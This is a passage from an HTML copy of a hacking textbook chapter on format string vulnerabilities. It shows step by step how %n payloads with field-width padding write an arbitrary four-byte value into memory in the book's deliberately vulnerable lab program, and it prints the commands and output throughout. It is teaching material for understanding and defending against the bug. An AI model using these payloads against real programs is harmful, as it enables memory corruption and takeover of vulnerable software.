<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x354 Writing to Arbitrary Memory Addresses</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part64.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part66.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark55">0x354 Writing to Arbitrary Memory Addresses</a></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">If the <span class="s31">%s </span>format parameter can be used to read an arbitrary memory address, you should be able to use the same technique with <span class="s31">%n </span>to write to an arbitrary memory address. Now things are getting interesting.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The <span class="s31">test_val </span>variable has been printing its address and value in the debug statement of the vulnerable fmt_vuln.c program, just begging to be overwritten. The test variable is located at <span class="s31">0x08049794</span>, so by using a similar technique, you should be able to write to the variable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_512.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\xd7\xfd\xff\xbf&quot;)%08x.%08x.%08x.%s The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">????%08x.%08x.%08x.%s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/ usr/games</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%08x.%08x.%08x.%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??%08x.%08x.%08x.%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0.b7fe75fc.00000000.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 31 0x0000001f reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_513.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">As this shows, the <span class="s31">test_val </span>variable can indeed be overwritten using the</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">%n <span class="p">format parameter. The resulting value in the test variable depends on the number of bytes written before the </span>%n<span class="p">. This can be controlled to a greater degree by manipulating the field width option.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_514.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%x%x%x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 21 0x00000015</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%100x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??%x%x%100x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 120 0x00000078</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%180x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??%x%x%180x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 200 0x000000c8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%400x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%x%x%400x%n</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc 0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 420 0x000001a4 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_515.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">By manipulating the field-width option of one of the format parameters before the <span class="s31">%n</span>, a certain number of blank spaces can be inserted, resulting in the output having some blank lines. These lines, in turn, can be used to control the number of bytes written before the <span class="s31">%n </span>format parameter. This approach will work for small numbers, but it won’t work for larger ones, like memory addresses.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Looking at the hexadecimal representation of the <span class="s31">test_val </span>value, it’s apparent that the least significant byte can be controlled fairly well. (Remember that the least significant byte is actually located in the first byte of the four- byte word of memory.) This detail can be used to write an entire address. If four writes are done at sequential memory addresses, the least significant byte can be written to each byte of a four-byte word, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:91.44pt" cellspacing="0"><tr style="height:12pt"><td style="width:117pt;border-top-style:solid;border-top-width:1pt"><p class="s45" style="padding-top: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Memory</p></td><td style="width:216pt;border-top-style:solid;border-top-width:1pt"><p class="s45" style="padding-top: 1pt;padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">94 95 96 97</p></td></tr><tr style="height:11pt"><td style="width:117pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">First write to 0x08049794</p></td><td style="width:216pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">AA 00 00 00</p></td></tr><tr style="height:11pt"><td style="width:117pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Second write to 0x08049795</p></td><td style="width:216pt"><p class="s42" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BB 00 00 00</p></td></tr><tr style="height:11pt"><td style="width:117pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Third write to 0x08049796</p></td><td style="width:216pt"><p class="s42" style="padding-left: 31pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CC 00 00 00</p></td></tr><tr style="height:11pt"><td style="width:117pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Fourth write to 0x08049797</p></td><td style="width:216pt"><p class="s42" style="padding-left: 44pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DD 00 00 00</p></td></tr><tr style="height:14pt"><td style="width:117pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Result</p></td><td style="width:216pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">AA BB CC DD</p></td></tr></table><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">As an example, let’s try to write the address <span class="s31">0xDDCCBBAA </span>into the test variable. In memory, the first byte of the test variable should be <span class="s31">0xAA</span>, then <span class="s31">0xBB</span>, then <span class="s31">0xCC</span>, and finally <span class="s31">0xDD</span>. Four separate writes to the memory addresses <span class="s31">0x08049794</span>, <span class="s31">0x08049795</span>, <span class="s31">0x08049796</span>, and <span class="s31">0x08049797 </span>should accomplish this.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The first write will write the value <span class="s31">0x000000aa</span>, the second <span class="s31">0x000000bb</span>, the third</p><p class="s31" style="padding-left: 109pt;text-indent: -18pt;line-height: 108%;text-align: left;">0x000000cc<span class="p">, and finally </span>0x000000dd<span class="p">. The first write should be easy.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_516.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%8x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 28 0x0000001c reader@hacking:~/booksrc $ gdb -q</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) p 0xaa - 28 + 8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 150</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%150x%n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%x%x%150x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc 0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 170 0x000000aa reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_517.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The last <span class="s31">%x </span>format parameter uses 8 as the field width to standardize the output. This is essentially reading a random DWORD from the stack, which could output anywhere from 1 to 8 characters. Since the first overwrite puts 28 into test_val, using 150 as the field width instead of 8 should control the least significant byte of <span class="s31">test_val </span>to <span class="s31">0xAA</span>.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Now for the next write. Another argument is needed for another <span class="s31">%x </span>format parameter to increment the byte count to 187, which is 0xBB in decimal. This argument could be anything; it just has to be four bytes long and must be located after the first arbitrary memory address of <span class="s31">0x08049754</span>. Since this is all still in the memory of the format string, it can be easily controlled. The word <span class="s27">JUNK </span>is four bytes long and will work fine.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 10pt;text-align: left;">After that, the next memory address to be written to, <span class="s31">0x08049755</span>, should</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">be put into memory so the second <span class="s31">%n </span>format parameter can access it. This means the beginning of the format string should consist of the target mem- ory address, four bytes of junk, and then the target memory address plus one. But all of these bytes of memory are also printed by the format function, thus incrementing the byte counter used for the <span class="s31">%n </span>format parameter. This is getting tricky.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Perhaps we should think about the beginning of the format string ahead of time. The goal is to have four writes. Each one will need to have a memory address passed to it, and among them all, four bytes of junk are needed to properly increment the byte counter for the <span class="s31">%n </span>format parameters. The first</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">%x <span class="p">format parameter can use the four bytes found before the format string itself, but the remaining three will need to be supplied data. For the entire write procedure, the beginning of the format string should look like this:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s69" style="padding-bottom: 1pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">0x08049794       0x08049795       0x08049796       0x08049797</p><table style="border-collapse:collapse;margin-left:92.868pt" cellspacing="0"><tr style="height:13pt"><td style="width:47pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s70" style="padding-top: 1pt;padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">94 97 04 08</p><p class="s71" style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_518.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_519.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_520.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">J</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="1" height="4" alt="image" src="Image_521.png"/></span></p></td><td style="width:11pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">U</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="0" height="1" alt="image" src="Image_522.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">N</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_523.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">K</p></td><td style="width:47pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s70" style="padding-top: 1pt;padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">95 97 04 08</p><p class="s71" style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_524.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_525.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_526.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">J</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="1" height="4" alt="image" src="Image_527.png"/></span></p></td><td style="width:11pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">U</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="0" height="1" alt="image" src="Image_528.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">N</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_529.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">K</p></td><td style="width:47pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s70" style="padding-top: 1pt;padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">96 97 04 08</p><p class="s71" style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_530.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_531.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_532.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">J</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="1" height="4" alt="image" src="Image_533.png"/></span></p></td><td style="width:11pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">U</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="0" height="1" alt="image" src="Image_534.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">N</p><p style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_535.png"/></span></p></td><td style="width:12pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s72" style="padding-top: 1pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">K</p></td><td style="width:47pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s70" style="padding-top: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">97 97 04 08</p><p class="s71" style="padding-left: 11pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="1" height="1" alt="image" src="Image_536.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_537.png"/></span>	<span><img width="1" height="1" alt="image" src="Image_538.png"/></span></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;">Let’s give it a try.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_539.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\ x97\x04\x08JUNK\x97\x97\x04\x08&quot;)%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3c0b7fe75fc   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 52 0x00000034 reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xaa - 52 + 8&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 126</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\ x97\x04\x08JUNK\x97\x97\x04\x08&quot;)%x%x%126x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%126x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3c0b7fe75fc 0</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = 170 0x000000aa reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_540.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The addresses and junk data at the beginning of the format string changed the value of the necessary field width option for the <span class="s31">%x </span>format parameter. However, this is easily recalculated using the same method as before. Another way this could have been done is to subtract 24 from the previous field width value of 150, since 6 new 4-byte words have been added to the front of the format string.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Now that all the memory is set up ahead of time in the beginning of the format string, the second write should be simple.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_541.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xbb - 0xaa&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 17</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\ x97\x04\x08JUNK\x97\x97\x04\x08&quot;)%x%x%126x%n%17x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3b0b7fe75fc</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0    4b4e554a</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = 48042 0x0000bbaa reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_542.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The next desired value for the least significant byte is <span class="s31">0xBB</span>. A hexa- decimal calculator quickly shows that 17 more bytes need to be written before the next <span class="s31">%n </span>format parameter. Since memory has already been set up for a <span class="s31">%x </span>format parameter, it’s simple to write 17 bytes using the field width option.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">This process can be repeated for the third and fourth writes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_543.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xcc - 0xbb&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 17</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xdd - 0xcc&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 17</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\ x97\x04\x08JUNK\x97\x97\x04\x08&quot;)%x%x%126x%n%17x%n%17x%n%17x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3b0b7fe75fc</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 12pt;line-height: 106%;text-align: left;">0    4b4e554a    4b4e554a    4b4e554a [*] test_val @ 0x08049794 = -573785174 0xddccbbaa reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_544.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">By controlling the least significant byte and performing four writes, an entire address can be written to any memory address. It should be noted that the three bytes found after the target address will also be overwritten using this technique. This can be quickly explored by statically declaring another initialized variable called <span class="s31">next_val</span>, right after <span class="s31">test_val</span>, and also displaying this value in the debug output. The changes can be made in an editor or with some more <span class="s31">sed </span>magic.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Here, <span class="s31">next_val </span>is initialized with the value <span class="s31">0x11111111</span>, so the effect of the write operations on it will be apparent.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" 